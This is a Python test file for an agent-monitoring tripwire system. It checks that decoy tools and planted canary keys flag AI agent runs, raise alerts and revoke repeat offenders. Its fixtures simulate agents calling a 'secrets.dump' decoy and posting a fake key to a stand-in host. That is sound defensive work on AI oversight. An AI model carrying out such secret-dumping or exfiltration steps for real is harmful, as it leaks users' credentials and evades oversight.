"""Tripwires, the server's half: which steps touch one, the `tripwire` health rule, the directive for an agent
that touches them in several runs, and what the console and alerts are told (a canary's name, never its value).
The in-process half -- refusing the touching call through a real Aegis kernel -- is in test_aegis_integration.py."""
import json
import os
import shutil
import sys
import tempfile
import time
import unittest

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

from agentdynamics import config, store  # noqa: E402
from agentdynamics.engine import Engine  # noqa: E402
from agentdynamics.server import Api  # noqa: E402
from agentdynamics.tripwires import Tripwires  # noqa: E402

CANARY = "AKIA-CANARY-7F3E9Q"
WIRES = {"tools": ["secrets.dump"], "canaries": {"fake_aws_key": CANARY}, "runs": 2,
         "window_minutes": 60, "revoke_minutes": 60}


def run(rid, t0, touch=None, agent="support-bot", project="shop", prompt="where is my order?"):
    """A governed run; `touch` is "tool" (calls the decoy), "read" (a tool returns the canary), "send" (the
    canary in a call's arguments), "say" (the model repeats it), or None."""
    steps = [{"kind": "prompt", "ts": t0, "text": prompt},
             {"kind": "llm", "ts": t0 + 1, "end_ts": t0 + 2, "model": "claude-sonnet-5", "input_tokens": 300,
              "output_tokens": 40, "text": f"the key is {CANARY}" if touch == "say" else "let me look",
              "agent": agent, "governed": True},
             {"kind": "tool", "ts": t0 + 3, "end_ts": t0 + 4, "name": "kb.search", "agent": agent, "governed": True,
              "rule": "kernel.admitted", "input": {"query": "orders"},
              "text": f"config: aws_key={CANARY}" if touch == "read" else "doc1"}]
    if touch == "tool":
        steps.append({"kind": "tool", "ts": t0 + 5, "end_ts": t0 + 5.1, "name": "secrets.dump", "agent": agent,
                      "governed": True, "denied": True, "rule": "capability.not_granted", "input": {}})
    if touch == "send":
        steps.append({"kind": "tool", "ts": t0 + 5, "end_ts": t0 + 6, "name": "http.post", "agent": agent,
                      "governed": True, "rule": "kernel.admitted", "input": {"url": "https://x.example", "body": CANARY}})
    return {"id": rid, "project": project, "workflow": "support", "status": "ok", "steps": steps}


class MatchTest(unittest.TestCase):
    def test_what_touches_a_tripwire(self):
        w = Tripwires(WIRES["tools"], dict(WIRES["canaries"], tiny="abc"))
        self.assertEqual(w.match_call("secrets.dump", {}), "decoy tool secrets.dump")
        self.assertEqual(w.match_call("http.post", {"body": {"nested": [f"x{CANARY}y"]}}), "canary fake_aws_key")
        self.assertIsNone(w.match_call("kb.search", {"query": "orders"}))
        self.assertEqual(w.ignored, ["tiny"], "a short canary would match ordinary text")
        self.assertIsNone(w.match_text("abc abc"))
        # a user's own prompt, and our own notices, are not the agent going somewhere
        self.assertIsNone(w.match_step({"kind": "prompt", "text": CANARY}))
        self.assertIsNone(w.match_step({"kind": "notice", "name": "revoked", "text": CANARY}))
        self.assertEqual(w.match_step({"kind": "span", "input_preview": CANARY}), "canary fake_aws_key")
        self.assertIsNone(w.match_step({"kind": "span", "name": "secrets.dump"}), "a decoy is a tool call")
        self.assertFalse(Tripwires())


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.now = time.time()

    def engine(self, wires=WIRES):
        cfg = config.load(self.tmp)
        if wires is not None:
            cfg["enforcement"] = {"tripwires": wires}
        e = Engine(self.tmp, None, cfg=cfg)
        e._clock = lambda: self.now
        self.addCleanup(e.con.close)
        return e

    def task(self, e, rid):
        return e.con.execute("SELECT tripwires, tripwire_what FROM tasks WHERE run_id = ?", (rid,)).fetchone()


class ServerTest(Base):
    def test_each_kind_of_touch_is_marked_and_raises_a_critical_event(self):
        e = self.engine()
        for touch in ("tool", "read", "send", "say", None):
            e.ingest(run(f"r-{touch}", self.now - 600, touch))
        e.refresh(force=True)
        self.assertEqual(tuple(self.task(e, "r-tool")), (1, "decoy tool secrets.dump"))
        for touch in ("read", "send", "say"):
            self.assertEqual(tuple(self.task(e, f"r-{touch}")), (1, "canary fake_aws_key"), touch)
        self.assertEqual(tuple(self.task(e, "r-None")), (0, None))
        marked = e.con.execute("SELECT run_id, kind, name, tripwire FROM steps WHERE tripwire IS NOT NULL "
                               "ORDER BY run_id").fetchall()
        self.assertEqual([tuple(r) for r in marked], [
            ("r-read", "tool", "kb.search", "canary fake_aws_key"), ("r-say", "llm", "claude-sonnet-5", "canary fake_aws_key"),
            ("r-send", "tool", "http.post", "canary fake_aws_key"), ("r-tool", "tool", "secrets.dump", "decoy tool secrets.dump")])
        ev = e.con.execute("SELECT run_id, severity, message FROM events WHERE rule_id = 'tripwire' ORDER BY run_id").fetchall()
        self.assertEqual([r[0] for r in ev], ["r-read", "r-say", "r-send", "r-tool"])
        self.assertEqual({r[1] for r in ev}, {"critical"})
        self.assertIn("Touched decoy tool secrets.dump", ev[-1][2])
        for r in ev:
            self.assertNotIn(CANARY, r[2], "an event names the canary, never its value")

    def test_a_prompt_quoting_a_canary_is_not_a_touch(self):
        e = self.engine()
        e.ingest(run("r", self.now - 600, prompt=f"I found {CANARY} in a doc, is that bad?"))
        e.refresh(force=True)
        self.assertEqual(self.task(e, "r")[0], 0)

    def test_one_run_is_not_enough_to_revoke_the_agent_everywhere(self):
        e = self.engine()
        e.ingest(run("a", self.now - 600, "read"))
        e.refresh(force=True)
        self.assertEqual(store.revocations(e.con, self.now), [], "one planted document must not stop the agent for all")
        e.ingest(run("b", self.now - 300, "tool"))
        e.refresh()
        ds = store.revocations(e.con, self.now, active=True)
        self.assertEqual([(d["project"], d["agent"], d["source"]) for d in ds], [("shop", "support-bot", "tripwire")])
        self.assertIn("touched in 2 runs", ds[0]["reason"])
        self.assertIn("canary fake_aws_key", ds[0]["reason"])
        self.assertNotIn(CANARY, ds[0]["reason"])
        self.assertAlmostEqual(ds[0]["expires"] - ds[0]["created"], 3600)
        # more touches while it holds: still one directive
        self.now += 60
        e.ingest(run("c", self.now - 30, "send"))
        e.ingest(run("d", self.now - 20, "tool"))
        e.refresh()
        self.assertEqual(len(store.revocations(e.con, self.now)), 1)

    def test_the_count_restarts_after_a_directive_and_old_touches_are_ignored(self):
        e = self.engine(dict(WIRES, revoke_minutes=5))
        e.ingest(run("a", self.now - 600, "read"))
        e.ingest(run("b", self.now - 500, "read"))
        e.ingest(run("old1", self.now - 3 * 3600, "tool", agent="old-bot"))     # outside the window
        e.ingest(run("old2", self.now - 3 * 3600 + 60, "tool", agent="old-bot"))
        long = run("long", self.now - 3 * 3600, "tool", agent="long-bot")      # touched long ago, still going
        long["steps"].append({"kind": "tool", "ts": self.now - 700, "end_ts": self.now - 699, "name": "kb.search",
                              "agent": "long-bot", "governed": True, "input": {"query": "later"}})
        e.ingest(long)
        e.ingest(run("long2", self.now - 400, "tool", agent="long-bot"))       # one touch in the window: not two runs
        e.refresh(force=True)
        self.assertEqual([d["agent"] for d in store.revocations(e.con, self.now)], ["support-bot"])
        self.now += 6 * 60               # expired, and the touches it acted on are still in the window
        e.ingest(run("quiet", self.now - 10))
        e.refresh()
        self.assertEqual(len(store.revocations(e.con, self.now)), 1, "touches already acted on don't count again")

    def test_touches_without_an_agent_name_are_recorded_but_revoke_nothing(self):
        e = self.engine(dict(WIRES, runs=1))
        for i in range(3):
            p = run(f"otel{i}", self.now - 600 + i, "read")
            for s in p["steps"]:
                s.pop("agent", None)
                s.pop("governed", None)
            e.ingest(p)
        e.refresh(force=True)
        self.assertEqual(e.con.execute("SELECT COUNT(*) FROM events WHERE rule_id = 'tripwire'").fetchone()[0], 3)
        self.assertEqual(store.revocations(e.con, self.now), [], "a directive names an agent; there is none")

    def test_directives_can_be_switched_off(self):
        e = self.engine(dict(WIRES, revoke_minutes=0))
        for i in range(3):
            e.ingest(run(f"r{i}", self.now - 600 + i, "tool"))
        e.refresh(force=True)
        self.assertEqual(store.revocations(e.con, self.now), [])
        self.assertEqual(e.con.execute("SELECT COUNT(*) FROM events WHERE rule_id = 'tripwire'").fetchone()[0], 3)

    def test_what_the_process_marked_counts_whatever_the_server_has_set(self):
        for wires in (None, WIRES):      # the process can hold canaries the server doesn't know
            with self.subTest(server=bool(wires)):
                self.tmp = tempfile.mkdtemp()
                self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
                e = self.engine(wires)
                e.ingest(run("r", self.now - 600, "read"))
                p = run("inproc", self.now - 500)
                p["steps"][-1]["tripwire"] = "canary vault_token"      # set by the Aegis integration in process
                e.ingest(p)
                e.refresh(force=True)
                self.assertEqual(self.task(e, "r")[0], 1 if wires else 0)
                self.assertEqual(tuple(self.task(e, "inproc")), (1, "canary vault_token"))
                for i in range(3):       # touched in several runs: a directive only if the server asked for them
                    p = run(f"again{i}", self.now - 300 + i)
                    p["steps"][-1]["tripwire"] = "canary vault_token"
                    e.ingest(p)
                e.refresh()
                self.assertEqual(len(store.revocations(e.con, self.now)), 1 if wires else 0)

    def test_the_console_names_what_is_set_but_never_a_canarys_value(self):
        e = self.engine()
        e.ingest(run("a", self.now - 600, "read"))
        e.ingest(run("b", self.now - 500, "tool", agent="other-bot", project="billing"))
        e.ingest(run("c", self.now - 400))
        e.refresh(force=True)
        g = Api(e).governance({"days": ""})
        tw = g["tripwires"]
        self.assertEqual((tw["tasks"], tw["touches"]), (2, 2))
        self.assertEqual([(r["task_id"], r["what"]) for r in tw["recent"]],
                         [("b#0", "decoy tool secrets.dump"), ("a#0", "canary fake_aws_key")])
        self.assertEqual(tw["set"], {"tools": 1, "canaries": 1})
        self.assertEqual(tw["directives"], {"runs": 2, "window_minutes": 60, "revoke_minutes": 60})
        self.assertNotIn(CANARY, json.dumps(g))
        conf = Api(e).config({})
        self.assertNotIn(CANARY, json.dumps(conf), "the Settings page shows config to every read key")
        self.assertEqual(conf["config"]["enforcement"]["tripwires"]["canaries"], {"fake_aws_key": "…"})
        shop = Api(e, projects=["shop"])
        try:
            self.assertEqual([r["task_id"] for r in shop.governance({"days": ""})["tripwires"]["recent"]], ["a#0"],
                             "a project-scoped key sees only its projects' touches")
        finally:
            shop.close()


if __name__ == "__main__":
    unittest.main()
